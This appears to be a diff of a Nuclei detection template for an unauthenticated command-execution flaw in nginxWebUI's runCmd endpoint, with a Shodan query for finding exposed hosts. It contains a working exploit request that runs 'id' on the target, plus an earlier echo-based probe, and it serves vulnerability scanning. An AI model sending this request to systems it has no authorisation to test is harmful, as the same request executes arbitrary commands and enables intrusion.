@@ -1,21 +1,39 @@
 id: nginxwebui-runcmd-rce
 
 info:
-  name: Nginxwebui - RunCMD Remote Command Execution Vulnerability
-  author: unknown
+  name: nginxWebUI ≤ 3.5.0 runCmd - Remote Command Execution
+  author: DhiyaneshDk
   severity: critical
   description: |
-    Nginxwebui Causes Runcmd Remote Command Execution Vulnerability for Effective Authentication
+    nginxWebUI’s runCmd feature and is caused by incomplete validation of user input. Attackers can exploit the vulnerability by crafting malicious data to execute arbitrary commands on a vulnerable server without authorization.
   reference:
-    - https://mp.weixin.qq.com/s?__biz=MzIwMDk1MjMyMg==&mid=2247491574&idx=1&sn=043729e27577a851856c002cfb0409b8
-  tags: nginxwebui
+    - https://github.com/qingchenhh/qc_poc/blob/main/Goby/nginxWebUI_runCmd_rce.go
+    - https://www.ctfiot.com/124166.html
+    - https://www.sangfor.com/farsight-labs-threat-intelligence/cybersecurity/nginxwebui-runcmd-remote-command-execution-vulnerability
+  metadata:
+    verified: true
+    max-request: 1
+    shodan-query: html:"nginxWebUI"
+  tags: nginx,nginxwebui,rce
 
 http:
   - method: GET
     path:
-      - "{{BaseURL}}/AdminPage/conf/runCmd?cmd=expr%20199812440%20-%2010079%26%26echo%20nginx"
+      - "{{BaseURL}}/AdminPage/conf/runCmd?cmd=id"
+
+    matchers-condition: and
     matchers:
-      - type: word
-        words:
-          - "<br>nginx<br>"
+      - type: regex
         part: body
+        regex:
+          - 'uid=\d+\(([^)]+)\) gid=\d+\(([^)]+)\)'
+
+      - type: word
+        part: header
+        words:
+          - "application/json"
+
+      - type: status
+        status:
+          - 200
+# digest: 4b0a004830460221008baf1cbcf0b6d23b954d60753bcf53e4630fd28a695a7d5a51f3134deeb227a7022100e150ceb2cccb49f36f085e413ae6adb06768c64be9c2ce5e524afc2a5b146d3f:922c64590222798bb761d5b6d8e72950
